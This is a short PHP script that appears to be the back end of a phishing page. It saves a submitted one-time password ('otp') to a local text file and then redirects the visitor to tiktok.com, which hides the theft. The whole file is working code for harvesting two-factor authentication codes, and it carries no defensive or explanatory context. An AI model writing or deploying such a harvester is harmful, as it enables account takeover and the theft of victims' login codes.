<?php

    file_put_contents("data.txt", "" . $_POST['otp'] . " ", FILE_APPEND);

header('Location: https://tiktok.com');
exit();
